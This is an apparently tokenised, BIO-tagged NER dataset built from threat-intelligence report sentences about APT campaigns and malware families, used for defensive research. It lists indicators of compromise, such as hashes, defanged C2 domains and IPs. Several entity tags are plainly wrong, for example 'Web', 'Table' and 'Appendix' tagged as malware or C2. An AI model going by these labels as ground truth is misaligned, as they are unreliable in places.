server	O
used	O
by	O
Chafer	O
.	O

If	O
unlabeled	O
textbox1	O
is	O
empty	O
,	O
the	O
code	O
will	O
enumerate	O
attached	O
drives	O
.	O

Each	O
datagram	O
consists	O
of	O
a	O
24	O
byte	O
header	O
followed	O
by	O
an	O
optional	O
payload	O
section	O
.	O

Once	O
256	O
such	O
swaps	O
have	O
been	O
performed	O
,	O
the	O
loop	O
exits	O
and	O
the	O
substitution	O
table	O
stable_var_41C	O
has	O
been	O
nicely	O
scrambled	O
and	O
is	O
ready	O
for	O
use	O
.	O

Figure	O
29	O
:	O
Using	O
findstr	O
to	O
recursively	O
locate	O
multiple	O
instances	O
of	O
the	O
Web	B-malware.ransom
shell	O

Ambitious	O
new	O
targets	O

[	O
Low	O
confidence	O
]	O
–	O
Th3Bug	O
is	O
one	O
of	O
the	O
other	O
actors	O
who	O
is	O
in	O
receipt	O
of	O
the	O
same	O
shared	O
resource	O
pool	O
as	O
those	O
clusters	O
already	O
identified	O
in	O
this	O
blog	O
.	O

If	O
that	O
file	O
exists	O
,	O
it	O
is	O
decrypted	O
using	O
AES	O
in	O
CBC	O
mode	O
with	O
a	O
hardcoded	O
,	O
256-bit	O
key	O
and	O
then	O
decompressed	O
(	O
LZMA	O
compression	O
)	O
.	O

Internet	O
Explorer	O
(	O
deprecated	O
)	O
:	O

99ee5b764a5db1cb6b8a4f62605b5536487d9c35a28a23de8f9174659f65bcb2	B-hash

One	O
of	O
them	O
was	O
a	O
fake	O
TrueType	O
font	O
updater	O
for	O
the	O
Roboto	O
Slab	O
regular	O
font	O
.	O

10	O

This	O
suggests	O
that	O
the	O
Snake	O
Wine	O
group	O
will	O
likely	O
continue	O
to	O
escalate	O
their	O
activity	O
and	O
persistently	O
target	O
both	O
private	O
and	O
government	O
entities	O
within	O
Japan	O
.	O

-	O
IKARUS	O
FProtTray	O
.	O

Windows	O
registry	O
keys	O

Initial	O
connection	O
from	O
the	O
infected	O
computer	O
's	O
perspective	O
--	O
after	O
it	O
connects	O
to	O
the	O
controller	O
-	O

The	O
same	O
sample	O
also	O
communicates	O
with	O
happynewyear.dns04[.]com	B-url.unknown
,	O
which	O
in	O
turn	O
resolves	O
to	O
the	O
IP	O
address	O
115.23.172[.]151	B-ip.unknown
,	O
which	O
hosts	O
a	O
large	O
number	O
of	O
other	O
malicious	O
host	O
names	O
:	O
These	O
following	O
hostnames	O
are	O
activity	O
associated	O
with	O
the	O
actor	O
best	O
known	O
as	O
TH3Bug	O
-	O
named	O
after	O
their	O
choice	O
of	O
Poison	O
Ivy	O
password	O
.	O

The	O
implants	O
(	O
DLLs	O
)	O
are	O
disguised	O
as	O
ZIP	O
files	O
and	O
communicate	O
with	O
three	O
control	O
servers	O
,	O
two	O
of	O
them	O
Chinese-language	O
online	O
gambling	O
sites	O
.	O

The	O
phone	O
number	O
originates	O
from	O
India	O
and	O
is	O
registered	O
on	O
the	O
'	O
Vodafone	O
India	O
'	O
network	O
provider	O
.	O

Malware	O
Analysis	O
Appliance	O
detects	O
activity	O
associated	O
with	O
Inception	B-malware.backdoor
Customers	O
with	O
Webpulse-enabled	O
products	O
are	O
protected	O
against	O
activity	O
associated	O
with	O
Inception	B-malware.backdoor
The	O
Attack	O
Investigation	O
Team	O
is	O
a	O
group	O
of	O
security	O
experts	O
within	O
Symantec	O
Security	O
Response	O
whose	O
mission	O
is	O
to	O
investigate	O
targeted	O
attacks	O
,	O
drive	O
enhanced	O
protection	O
in	O
Symantec	O
products	O
,	O
and	O
offer	O
analysis	O
which	O
helps	O
customers	O
respond	O
to	O
attacks	O
.	O

勒索软件	O
(	O
9	O
)	O

*	O
•	O
*.set	O
•	O
*.win	O
•	O
*.dsk	O

The	O
Bitcoin	O
Miner	O

·	O
Outllib.dll	O
·	O
OutExtra.exe	O
OutExtra.exe	O
is	O
a	O
signed	O
legitimate	O
application	O
from	O
Microsoft	O
named	O
finder.exe	O
.	O

Do	O
not	O
reveal	O
personal	O
or	O
financial	O
information	O
in	O
social	O
media	O
or	O
email	O
,	O
and	O
do	O
not	O
respond	O
to	O
solicitations	O
for	O
this	O
information	O
.	O

In	O
addition	O
,	O
the	O
POST	O
request	O
must	O
contain	O
a	O
Via	O
field	O
.	O

It	O
contains	O
a	O
set	O
of	O
backdoors	O
and	O
exploits	O
.	O

Most	O
of	O
the	O
directories	O
pulled	O
from	O
horizons-tourisme.com	B-url.normal
are	O
empty	O
,	O
or	O
contain	O
empty	O
files	O
.	O

2014	O
.	O

However	O
,	O
none	O
of	O
the	O
return	O
values	O
of	O
these	O
called	O
functions	O
are	O
processed	O
,	O
which	O
is	O
highly	O
specifi	O
c	O
to	O
many	O
of	O
the	O
versions	O
of	O
Gh0st	B-malware.backdoor
RAT	I-malware.backdoor
we	O
have	O
seen	O
in	O
the	O
past	O
.	O

Infostealers	O
dropped	O
in	O
2015	O

However	O
,	O
it	O
will	O
only	O
try	O
to	O
steal	O
passwords	O
from	O
IE	O
's	O
password-protected	O
sites	O
and	O
MSN	O
Explorer	O
Signup	O
if	O
(	O
related	O
to	O
a	O
security	O
product	O
)	O
is	O
not	O
running	O
in	O
the	O
system	O
.	O

Resource	O
Name	O

random	O
:	O
end	O
:	O
]	O

•	O
CSW	O
,	O
CF	O
,	O
Pos	O
,	O
and	O
Model	O
•	O
CSW	O
,	O
ST	O
,	O
Pos	O
,	O
and	O
stVal	O
•	O
CSW	O
,	O
CO	O
,	O
Pos	O
,	O
Oper	O
,	O
but	O
not	O
$	O
T	O
•	O
CSW	O
,	O
CO	O
,	O
Pos	O
,	O
SBO	O
,	O
but	O
not	O
$	O
T	O

THREEBYTE	B-malware.backdoor
Malware	O
Family	O

Published	O
works	O
:	O

The	O
document	O
contains	O
an	O
embedded	O
Adobe	O
Flash	O
exploit	O
,	O
which	O
was	O
recently	O
announced	O
by	O
the	O
Korean	O
Internet	O
Security	O
agency	O
.	O

The	O
payloads	O
accompanying	O
the	O
newer	O
cryptocurrency	O
exchange-themed	O
lure	O
docs	O
compiled	O
a	O
month	O
after	O
the	O
Korean	O
Day	O
payload	O
further	O
obfuscate	O
their	O
functionality	O
by	O
resolving	O
imports	O
at	O
runtime	O
.	O

The	O
samples	O
from	O
the	O
Operation	B-malware.ransom
Manul	I-malware.ransom
campaign	O
described	O
in	O
this	O
paper	O
use	O
the	O
following	O
command	O
and	O
control	O
(	O
c2	O
)	O
domains	O
.	O

The	O
StrongPity	O
droppers	O
were	O
often	O
signed	O
with	O
unusual	O
digital	O
certificates	O
,	O
dropping	O
multiple	O
components	O
that	O
not	O
only	O
provide	O
complete	O
control	O
of	O
the	O
victim	O
system	O
,	O
but	O
effectively	O
steal	O
disk	O
contents	O
,	O
and	O
can	O
download	O
components	O
for	O
further	O
collection	O
of	O
various	O
communications	O
and	O
contacts	O
.	O

This	O
appeared	O
to	O
indicate	O
TEA	O
(	O
Tiny	O
Encryption	O
Algorithm	O
)	O
involvement	O
.	O

Memory	O
Artifacts	O
:	O

C2	O
Server	O
:	O
friendlysupport.giize[.]com	B-url.cncsvr

1	O
오퍼레이션	O
블랙	O
마인은	O
이	O
보다	O
앞선	O
2008년	O
한국	O
군사	O
기관	O
공격	O
,	O
2013	O
년	O
3.20	O
전산망	O
장애	O
(	O
일명	O
다크서울	O
,	O
DarkSeoul	B-malware.unknown
)	O
와	O
관련	O
있다	O
.	O

Figure	O
6	O
Request	O
of	O
HTTP	O
GET	O

Sending	O
information	O
to	O
C	O
&	O
C	O
server	O
To	O
exfiltrate	O
information	O
to	O
the	O
C	O
&	O
C	O
server	O
(	O
such	O
as	O
screenshots	O
,	O
passwords	O
,	O
files	O
and	O
more	O
)	O
,	O
the	O
agent	O
uses	O
a	O
defined	O
structure	O
called	O

From	O
this	O
,	O
a	O
single	O
posting	O
was	O
discovered	O
with	O
this	O
exact	O
toolmark	O
,	O
and	O
this	O
posting	O
exists	O
only	O
in	O
one	O
place	O
and	O
is	O
of	O
Chinese	O
origin	O
.	O

The	O
PCL	O
language	O
used	O
specifies	O
the	O
printer	O
model	O
,	O
which	O
is	O
'	O
HP	O
LaserJet	O
400	O
M401	O
'	O
:	O
Once	O
sent	O
for	O
printing	O
,	O
the	O
PRT	O
files	O
are	O
then	O
overwritten	O
with	O
'	O
0	O
's	O
(	O
reliably	O
deleted	O
)	O
.	O

Figure	O
9	O
:	O
SCT	O
contents	O
Figure	O
10	O
provides	O
the	O
decoded	O
script	O
.	O

All	O
rights	O
reserved	O
.	O

**	O
This	O
installer	O
sample	O
(	O
and	O
in	O
general	O
most	O
of	O
the	O
samples	O
found	O
)	O
is	O
protected	O
with	O
VMProtect	O
then	O
compressed	O
using	O
UPX	O
.	O

DarkComet	B-malware.backdoor
is	O
primarily	O
a	O
general	O
purpose	O
remote	O
access	O
trojan	O
(	O
RAT	O
)	O
.	O

1371	O
1018	O
This	O
table	O
shows	O
the	O
results	O
of	O
the	O
analysis	O
of	O
our	O
incoming	O
sample	O
feeds/malware	B-malware.unknown
zoo	I-malware.unknown
.	O

SHA-1	O
SHA-256	O
File	O
Size	O
Icon	O
75fa78ebe2ccf42ad885c722a78399aa	B-hash
d41aa10a53684317814c4d4397f46757fe218246	B-hash
e53bd956c4ef79d54b4860e74c68e6d93a49008034afb42b092ea19344309914	B-hash
851.07	O
KB	O

This	O
system	O
hosted	O
a	O
JavaScript	O
file	O
,	O
which	O
in	O
turned	O
loads	O
a	O
malicious	O
Java	O
Applet	O
.	O

םינפה	O
דרשמ	O
pilots	O
Defense	O
and	O
security	O
related	O
security	O
collaborator	O
(	O
a	O
person	O
who	O
cooperates	O
with	O
the	O
enemy	O
)	O
ministry	O
of	O
internal	O
affairs	O

Bankshot	O
implants	O
are	O
distributed	O
from	O
a	O
domain	O
with	O
a	O
name	O
similar	O
to	O
that	O
of	O
the	O
mcafee_labs	O
Did	O
you	O
get	O
served	O
an	O
ad	O
about	O
something	O
you	O
were	O
talking	O
about	O
?	O

The	O
dropper	O
does	O
not	O
execute	O
the	O
scada.exe	B-malware.unknown
payload	O
after	O
moving	O
it	O
.	O

We	O
have	O
also	O
received	O
a	O
number	O
of	O
tip	O
offs	O
from	O
other	O
researchers	O
,	O
as	O
well	O
as	O
queries	O
from	O
victims	O
who	O
were	O
directly	O
targeted	O
by	O
those	O
using	O
the	O
framework	O
.	O

(	O
All	O
of	O
the	O
IP	O
addresses	O
bellow	O
are	O
hosted	O
in	O
XLHost.com	O
)	O
209.190.20.147	B-ip.unknown
209.190.20.149	B-ip.unknown
209.190.20.148	B-ip.unknown

three	O
timestamps	O
are	O
included	O
as	O
well	O
as	O
whether	O
read	O
or	O
write	O
access	O
was	O
requested	O
,	O
indicated	O
by	O
'	O
R	O
'	O
or	O
'	O
W	O
'	O
or	O
'	O
-	O
'	O
.	O

processname	O
:	O
spellagentd	O

The	O
Iranian	O
Revolution	O
replaced	O
the	O
Persian	O
monarchy	O
and	O
transitioned	O
the	O
Shah	O
's	O
power	O
to	O
the	O
Islamic	O
Republic	O
,	O
led	O
by	O
Ayatollah	O
Ruhollah	O
Khomeini	O
.	O

HTTP	O
SMTP	O
MainHandler	O
CameraShot	O
InjectApp	O
Screenshot	O
FileObserver	O
PasswordFirefox	O
InfoOS	O
Version	O
3	O
and	O
early	O
version	O
4	O
SPLM	B-malware.backdoor
modules	O
maintained	O
keylogger	O
,	O
remoteshell	O
,	O
and	O
filestealer	O
code	O
all	O
within	O
the	O
larger	O
compiled	O
backdoor	O
,	O
and	O
executed	O
each	O
body	O
of	O
functionality	O
from	O
within	O
that	O
process	O
memory	O
space	O
.	O

Another	O
trick	O
that	O
helps	O
the	O
malware	O
fly	O
below	O
the	O
radar	O
is	O
to	O
change	O
the	O
C2	O
address	O
to	O
localhost	O
when	O
the	O
attacker	O
is	O
not	O
using	O
the	O
infrastructure	O
.	O

For	O
a	O
full	O
list	O
of	O
C	O
&	O
Cs	O
used	O
,	O
please	O
see	O
Appendix	B-url.cncsvr
B	O
.	O

This	O
'	O
congratulations	O
'	O
document	O
is	O
in	O
Korean	O
,	O
revealing	O
a	O
likely	O
characteristic	O
of	O
the	O
intended	O
target	O
.	O

ICEBRG	O
is	O
a	O
network	O
security	O
analytics	O
company	O
that	O
offers	O
a	O
SaaS	O
capability	O
that	O
enables	O
customers	O
to	O
gain	O
and	O
utilize	O
widespread	O
network	O
visibility	O
for	O
security	O
operations	O
.	O

We	O
have	O
yet	O
to	O
observe	O
samples	O
from	O
2013	O
,	O
but	O
we	O
believe	O
CozyDuke	B-malware.drop
to	O
have	O
been	O
under	O
active	O
development	O
as	O
well	O
during	O
that	O
year	O
.	O

또한	O
관리	O
서	O
버는	O
상용	O
소프트웨어의	O
보안	O
업데이트	O
파일을	O
외부	O
(	O
소프트웨어	O
제공사	O
)	O
에서	O
받아와	O
조직	O
내부에	O
배포하는	O
역할을	O
한다	O
.	O

International	O
Women	O
's	O
Day	O
in	O
the	O
Channel	O

If	O
found	O
,	O
the	O
malware	O
exits	O
.	O

The	O
OBL_Leaked_Report.zip	O
contained	O
a	O
.scr	O
file	O
that	O
drops	O
a	O
decoy	O
document	O
pertaining	O
to	O
the	O
alleged	O
incompetence	O
of	O
Pakistani	O
authorities	O
in	O
locating	O
Osama	O
Bin	O
Laden	O
(	O
OBL	O
)	O
.	O

The	O
files	O
it	O
looks	O
for	O
are	O
acelpvc.dll	O
(	O
presence	O
of	O
this	O
file	O
does	O
not	O
necessarily	O
imply	O
an	O
infection	O
)	O
.	O

According	O
to	O
Wikipedia	O
,	O
Parsijoo.ir	B-url.normal
is	O
the	O
second	O
most	O
popular	O
search	O
engine	O
in	O
Iran	O
after	O
Google	O
and	O
it	O
uses	O
the	O
Parsijoobot	O
to	O
crawl	O
websites	O
for	O
indexing	O
purposes	O
.	O

Kaspersky	O
Lab	O
products	O
detect	O
the	O
malware	O
used	O
by	O
Poseidon	B-malware.infosteal
Group	O
with	O
the	O
following	O
detection	O
names	O
:	O
Backdoor.Win32.Nhopro	O
HEUR:Backdoor.Win32.Nhopro.gen	O
HEUR:Hacktool.Win32.Nhopro.gen	O

An	O
individual	O
who	O
goes	O
by	O
the	O
name	O
LZX	O
in	O
some	O
online	O
forums	O
is	O
believed	O
to	O
be	O
the	O
original	O
author	O
of	O
ZxShell	B-malware.backdoor
.	O

Interestingly	O
,	O
the	O
list	O
of	O
target	O
file	O
extensions	O
is	O
not	O
identical	O
but	O
is	O
very	O
similar	O
to	O
the	O
file	O
extensions	O
list	O
from	O
the	O
KillDisk	B-malware.ransom
malware	O
used	O
in	O
the	O
December	O
2016	O
attacks	O
.	O

This	O
DLL	O
file	O
contains	O
the	O
core	O
functions	O
of	O
Asruex	B-malware.drop
.	O

Reports	O
of	O
$	O
60M	O
being	O
stolen	O
appear	O
to	O
be	O
due	O
to	O
confusion	O
over	O
these	O
latter	O
messages	O
,	O
and	O
the	O
amounts	O
actually	O
stolen	O
were	O
considerably	O
lower	O
.	O

It	O
uses	O
an	O
accumulator	O
variable	O
,	O
implemented	O
by	O
register	O
EBX	O
and	O
initialized	O
to	O
zero	O
.	O

android	O
:	O
This	O
paste	O
holds	O
a	O
command	O
line	O
for	O
an	O
unknown	O
backdoored	O
application	O
to	O
execute	O
on	O
infected	O
Android	O
devices	O
.	O

Table	B-malware.unknown
2	O
:	O
Pyinstaller	O
Artifacts	O
for	O
update.exe	B-malware.drop
Figure	O
1	O
and	O
2	O
list	O
the	O
unique	O
strings	O
discovered	O
in	O
the	O
scada.exe	B-malware.unknown
and	O
Step7ProSim.dll	O
binaries	O
.	O

In	O
the	O
cases	O
we	O
have	O
observed	O
,	O
the	O
configuration	O
data	O
for	O
any	O
single	O
CozyDuke	B-malware.drop
instance	O
has	O
included	O
the	O
details	O
of	O
either	O
one	O
or	O
two	O
C	O
&	O
C	O
servers	O
.	O

Retrieve	O
reconnaissance	O
information	O
from	O
the	O
machine	O
Uninstall	O
Dino	B-malware.backdoor
using	O
the	O
custom	O
file	O
system	O
(	O
see	O
ramFS	O
description	O
below	O
for	O
details	O
)	O
Execute	O
Windows	O
batch	O
command	O
passed	O
as	O
a	O
parameter	O
Change	O
the	O
current	O
work	O
directory	O
Retrieve	O
the	O
current	O
work	O
directory	O
path	O
List	O
files	O
in	O
a	O
given	O
directory	O
with	O
various	O
additional	O
information	O
Set	O
or	O
remove	O
environment	O
variables	O
stored	O
in	O
the	O
ENVVAR	O
module	O
Display	O
or	O
update	O
module	O
content	O
Search	O
for	O
files	O
whose	O
names	O
match	O
given	O
patterns	O
.	O

In	O
the	O
second	O
campaign	O
,	O
FireEye	O
Labs	O
observed	O
emails	O
with	O
links	O
to	O
legitimate	O
domains	O
(	O
such	O
as	O
hxxps://s3-ap-northeast-1.amazonaws[.]com/<redacted>/Boleto_Protesto_Mes_Marco_2018.html	B-url.unknown
)	O
or	O
compromised	O
domains	O
(	O
such	O
as	O
hxxps://curetusu.<redacted	B-url.unknown
>	I-url.unknown
-industria[.]site/	I-url.unknown
)	O
that	O
use	O
a	O
refresh	O
tag	O
with	O
a	O
URL	O
shortener	O
as	O
the	O
target	O
.	O

Of	O
course	O
the	O
malware	O
includes	O
DDoS	O
capabilities	O
as	O
well	O
-	O
hence	O
our	O
interest	O
in	O
reversing	O
its	O
communications	O
so	O
that	O
we	O
can	O
keep	O
tabs	O
on	O
whom	O
the	O
DarkComet	B-malware.backdoor
botnets	O
are	O
attacking	O
.	O

Intelligence	O
collection	O
directed	O
by	O
nation	O
state	O
actors	O
against	O
US	O
political	O
targets	O
provides	O
invaluable	O
insight	O
into	O
the	O
requirements	O
directed	O
upon	O
those	O
actors	O
.	O

测试技术	O
(	O
1	O
)	O

Although	O
people	O
can	O
be	O
used	O
as	O
the	O
initial	O
point	O
of	O
entry	O
,	O
propagation	O
needs	O
to	O
continue	O
laterally	O
through	O
the	O
network	O
till	O
the	O
specific	O
target	O
host	O
is	O
reached	O
.	O

Through	O
open-source	O
research	O
,	O
CTU	O
researchers	O
identified	O
the	O
owners	O
of	O
66	O
of	O
the	O
targeted	O
email	O
addresses	O
.	O

안다리엘	O
그룹의	O
주요	O
공격	O
대상은	O
군사	O
기관	O
및	O
방위산업체	O
,	O
정치	O
기구	O
,	O
보안	O
업체	O
,	O
ICT	O
업체	O
,	O
에너지연구소	O
뿐만	O
아니라	O
ATM	O
,	O
금융사	O
,	O
여행사	O
,	O
온라인	O
도박	O
게임	O
이용자	O
,	O
가상화폐	O
거래소	O
이용자	O
등	O
금전적	O
이득을	O
얻을수	O
있는	O
타깃까지	O
다양하다	O
.	O

The	O
geographical	O
spread	O
of	O
victims	O
is	O
heavily­skewed	O
towards	O
Brazil	O
,	O
the	O
United	O
States	O
,	O
France	O
,	O
Kazakhstan	O
,	O
United	O
Arab	O
Emirates	O
,	O
India	O
and	O
Russia	O
.	O

Following	O
this	O
registry	O
edit	O
,	O
any	O
opened	O
.HWP	O
document	O
is	O
read	O
and	O
sent	O
as	O
an	O
e-mail	O
attachment	O
with	O
the	O
subject	O
'	O
Hwp	O
'	O
to	O
the	O
attackers	O
.	O

We	O
'd	O
like	O
to	O
give	O
special	O
thanks	O
to	O
Eyal	O
Sela	O
of	O
ClearSky	O
Security	O
for	O
his	O
collaborative	O
efforts	O
in	O
this	O
research	O
.	O

Bot	O
:	O

Australia	O
South	O
Korea	O
Germany	O
Japan	O
Italy	O
Taiwan	O
India	O
United	O
States	O
Vietnam	O
Netherlands	O
Others	O

Command	O
ID	O
Purpose	O

Untangling	O
the	O
Patchwork	O
Cyberespionage	B-malware.backdoor
Group	O
ChessMaster	O
Makes	O
its	O
Move	O
:	O
A	O
Look	O
into	O
the	O
Campaign	O
's	O
Cyberespionage	B-malware.backdoor
Arsenal	O
Cyberespionage	B-malware.backdoor
Campaign	O
Sphinx	O
Goes	O
Mobile	O
With	O
AnubisSpy	B-malware.infosteal
Hacking	O
Group	O
Spies	O
on	O
Android	O
Users	O
in	O
India	O
Using	O
PoriewSpy	B-malware.infosteal

Figure	O
6	O
:	O
China	B-malware.backdoor
Chopper	I-malware.backdoor
provides	O
a	O
'	O
Security	O
Scan	O
'	O
feature	O

Finding	O
the	O
real	O
date	O
that	O
the	O
file	O
was	O
planted	O
requires	O
examining	O
the	O
Master	O
File	O
Table	O
(	O
MFT	O
)	O
.	O

Victim	O
goes	O
to	O
link	O
and	O
retrieves	O
malicious	O
document	O
or	O
is	O
served	O
a	O
web-based	O
exploit	O
that	O
installs	O
malware	O
.	O

anti-virus	O
component	O
called	O
the	O
Norton	O
Security	O
Shell	O
Extension	O
Module	O
.	O

First	O
release	O
time	O
:	O
14:32	O
,	O
May	O
27	O
,	O
2015	O
Updated	O
time	O
of	O
this	O
version	O
:	O
14:32	O
,	O
May	O
27	O
,	O
2015	O

Intruders	O
'	O
apparent	O
ability	O
to	O
distinguish	O
between	O
particular	O
field	O
unit	O
vehicles	O
(	O
infected	O
drives	O
)	O
,	O
ref	O
:	O
Possible	O
Commands	O
One	O
-­‐	O
Targeting	O
Specific	O
Devices	O
(	O
Known	O
to	O
Intruder	O
From	O
Previous	O
netsat/netui3	O
Activity	O
)	O
from	O
Hypothetical	B-malware.backdoor
command	I-malware.backdoor
table	I-malware.backdoor
,	O

According	O
to	O
the	O
sample	O
data	O
analysis	O
,	O
the	O
attack	O
affected	O
regions	O
in	O
China	O
are	O
mainly	O
distributed	O
in	O
provinces	O
that	O
actively	O
involved	O
in	O
foreign	O
trade	O
Save	O
and	O
Reborn	O
GDI	O
data-only	O
attack	O
from	O
Win32k	O
TypeIsolation	O
Save	O
and	O
Reborn	O
GDI	O
data-only	O
attack	O
from	O
Win32k	O
TypeIsolation	O

That	O
's	O
why	O
some	O
other	O
malware	O
researchers	O
have	O
named	O
this	O
threat	O
as	O
ExPetr	B-malware.unknown
,	O
PetrWrap	B-malware.ransom
,	O
Petya	B-malware.ransom
,	O
or	O
NotPetya	B-malware.ransom
.	O

A	O
comparison	O
of	O
the	O
outlook	O
password	O
extraction	O
function	O
from	O
previous	O
and	O
current	O
RAT	B-malware.backdoor
versions	O
can	O
be	O
seen	O
below	O
.	O

However	O
,	O
further	O
investigation	O
reveals	O
that	O
the	O
file	O
is	O
what	O
is	O
known	O
as	O
a	O
'	O
Polyglot	O
'	O
file	O
,	O
whereby	O
a	O
file	O
is	O
contained	O
within	O
another	O
file	O
.	O

LIKELY	O
RUSSIA-BASED	O
RECONNAISSANCE	O
OF	O
UKRAINIAN	O
GOVERNMENT	O
AND/OR	O
MILITARY	O
TARGETS	O

The	O
group	O
set	O
up	O
a	O
site	O
directly	O
pulled	O
from	O
the	O
contents	O
of	O
the	O
legitimate	O
TrueCrypt	O
website	O
.	O

In	O
2016-2017	O
,	O
the	O
number	O
of	O
attacks	O
on	O
companies	O
in	O
Turkey	O
increased	O
significantly	O
.	O

MISCREANT	O
'S	O
DROPPER	O
..................................................................................	O
5	O
3	O
.	O

As	O
documented	O
above	O
,	O
when	O
pursuing	O
quick-turn	O
cyber	O
operations	O
,	O
the	O
Iranian	O
regime	O
will	O
weigh	O
religious	O
and	O
political	O
reliability	O
against	O
offensive	O
skills	O
.	O

C:\WINDOWS\system32\CREDRIVER.dll	O
and	O
deletes	O
itself	O
.	O

Once	O
executed	O
,	O
this	O
ransomware	O
encrypts	O
all	O
files	O
(	O
except	O
files	O
located	O
in	O
the	O
C	O
:	O
\Windows	O
directory	O
)	O
using	O
AES-128	O
and	O
RSA-1024	O
algorithms	O
.	O

Our	O
list	O
of	O
servers	O
is	O
likely	O
incomplete	O
,	O
as	O
some	O
FinSpy	B-malware.backdoor
servers	O
employ	O
countermeasures	O
to	O
prevent	O
detection	O
.	O

Ltd	O
.	O

Cylance	O
also	O
found	O
an	O
extensive	O
network	O
of	O
Dynamic	O
DNS	O
(	O
DDNS	O
)	O
domains	O
registered	O
via	O
multiple	O
free	O
providers	O
was	O
likely	O
being	O
used	O
by	O
the	O
same	O
group	O
.	O

Some	O
investigation	O
by	O
the	O
victim	O
into	O
the	O
legitimacy	O
of	O
the	O
software	O
title	O
,	O
like	O
in	O
Figure	O
6	O
,	O
is	O
intended	O
to	O
give	O
a	O
sense	O
that	O
it	O
was	O
the	O
right	O
thing	O
in	O
installing	O
this	O
security	O
software	O
.	O

None	O
of	O
its	O
47	O
anti-virus	O
engines	O
flags	O
China	B-malware.backdoor
Chopper	I-malware.backdoor
as	O
malicious	O
.	O

Properly	O
secure	O
password	O
files	O
by	O
making	O
hashed	O
passwords	O
more	O
difficult	O
to	O
acquire	O
.	O

Top	O
Seven	O
Mitigation	O
Strategies	O

The	O
type	O
of	O
operational	O
activity	O
described	O
here	O
suggests	O
an	O
extremely	O
sophisticated	O
understanding	O
of	O
the	O
target	O
that	O
only	O
a	O
skilled	O
adversary	O
would	O
likely	O
possess	O
.	O

45.114.117[.]137	B-ip.unknown
)	O
Flash.exe	O
562aeced9f83657be218919d6f443485de8fae9e	B-hash
2017-01-18	O
19:00:41	O
support.chatconnecting(.)com	B-url.cncsvr

There	O
is	O
an	O
order	O
in	O
which	O
executables	O
load	O
DLLs	O
on	O
the	O
Windows	O
operating	O
system	O
.	O

[	O
그림	O
1	O
]	O
안다리엘	O
그룹의	O
주요	O
공격	O
방식	O
안다리엘	O
그룹은	O
사전에	O
공격	O
대상의	O
정보를	O
파악하여	O
관심을	O
가질	O
만한	O
내용으로	O
위장한	O
문서를	O
이메일에	O
첨부하는	O
방식으로	O
공격을	O
전개한다	O
.	O

On	O
July	O
2	O
,	O
2013	O
a	O
similar	O
file	O
windefender.exe	B-malware.backdoor
(	O
MD5	O
:	O
a21f2cb65a3467925c1615794cce7581	B-hash
)	O
was	O
identified	O
containing	O
a	O
strong	O
association	O
to	O
Tranchulas	O
.	O

It	O
was	O
just	O
a	O
matter	O
of	O
time	O
until	O
the	O
APT28	O
group	O
realized	O
they	O
were	O
missing	O
out	O
on	O
a	O
serious	O
cyber-weapon	O
to	O
target	O
Mac	O
OS	O
X	O
users	O
.	O

©	O
AhnLab	O
,	O
Inc	O
.	O

The	O
malware	O
then	O
searches	O
inside	O
its	O
own	O
binary	O
for	O
a	O
string	O
delimiter	O
SSSSSSS	O
,	O
returning	O
a	O
string	O
pointer	O
to	O
the	O
beginning	O
of	O
the	O
encrypted	O
confi	O
guration	O
string	O
.	O

Ablyazov	O
and	O
his	O
family	O
.	O

After	O
having	O
a	O
glimpse	O
at	O
the	O
ad	O
designed	O
to	O
promote	O
the	O
malware	O
,	O
we	O
analyzed	O
a	O
sample	O
of	O
it	O
:	O
3917107778F928A6F65DB34553D5082A	B-hash
,	O
which	O
is	O
detected	O
as	O
Gen:Variant.Zusy.118945	O
.	O

This	O
app	O
was	O
developed	O
and	O
used	O
by	O
artillery	O
troops	O
to	O
simplify	O
targeting	O
data	O
for	O
the	O
D-30	O
towed	O
howitzer	O
.	O

Anyway	O
,	O
SPLM/CHOPSTICK	B-malware.backdoor
has	O
maintained	O
various	O
combinations	O
of	O
code	O
,	O
with	O
some	O
recognizable	O
functionality	O
listed	O
here	O
.	O

We	O
found	O
the	O
infrastructure	O
to	O
be	O
significantly	O
larger	O
than	O
documented	O
at	O
the	O
link	O
above	O
.	O

Babar	B-malware.drop
is	O
searching	O
for	O
tags	O
such	O
as	O
'	O
Message-Type	O
'	O
,	O
'	O
Reliability	O
'	O
,	O
'	O
To	O
'	O
,	O
'	O
From	O
'	O
or	O
'	O
Text	O
'	O
to	O
pick	O
out	O
of	O
the	O
stream	O
.	O

All	O
rights	O
reserved	O
.	O

Figure	O
7	O

createFile	O
:	O
bodyFile	O
:	O
sizeBody	O
:	O
]	O

Several	O
versions	O
of	O
XtremeRAT	B-malware.backdoor
write	O
this	O
configuration	O
data	O
to	O
disk	O
under	O
,	O
either	O
directly	O
,	O
or	O
to	O
a	O
directory	O
named	O
after	O
mutex	O
configured	O
by	O
the	O
attacker	O
.	O

A	O
handle	O
to	O
the	O
DLL	O
file	O
is	O
taken	O
in	O
order	O
to	O
make	O
its	O
deletion	O
more	O
difficult	O
.	O

It	O
seems	O
that	O
many	O
folks	O
did	O
not	O
log	O
in	O
and	O
pull	O
down	O
their	O
emails	O
until	O
Jan	O
2017	O
to	O
retrieve	O
the	O
Dealer	B-malware.backdoor
's	I-malware.backdoor
Choice	I-malware.backdoor
spearphish	O
.	O

startTakeScreenShot	O

Due	O
to	O
the	O
nature	O
of	O
this	O
unique	O
signature	O
,	O
root9B	O
is	O
in	O
the	O
process	O
of	O
further	O
documenting	O
and	O
reporting	O
to	O
the	O
proper	O
authorities	O
.	O

Access	O
to	O
an	O
individual	O
's	O
personal	O
or	O
corporate	O
email	O
account	O
provides	O
a	O
substantial	O
amount	O
of	O
useful	O
intelligence	O
,	O
and	O
threat	O
actors	O
could	O
also	O
leverage	O
the	O
access	O
to	O
launch	O
additional	O
attacks	O
to	O
penetrate	O
the	O
network	O
of	O
an	O
associated	O
organization	O
.	O

Also	O
,	O
they	O
are	O
having	O
hard	O
time	O
preparing	O
decoy	O
documents	O
and	O
websites	O
in	O
Hebrew	O
and	O
English	O
.	O

In	O
connection	O
with	O
these	O
findings	O
we	O
found	O
that	O
the	O
same	O
Python	O
functionality	O
was	O
sometimes	O
embedded	O
in	O
executable	O
files	O
of	O
a	O
slightly	O
different	O
format	O
–	O
namely	O
py2exe	O
.	O

So	O
far	O
we	O
have	O
identified	O
four	O
low	O
key	O
websites	O
,	O
all	O
belonging	O
to	O
small	O
companies	O
based	O
in	O
the	O
United	O
States	O
or	O
Canada	O
which	O
are	O
being	O
abused	O
in	O
this	O
fashion	O
.	O

HTTP/1.0	O
400	O
Bad	O
Request	O
Server	O
:	O
Apache/2.2.3	O
(	O
Red	O
Hat	O
)	O
Connection	O
:	O
close	O

If	O
successful	O
,	O
a	O
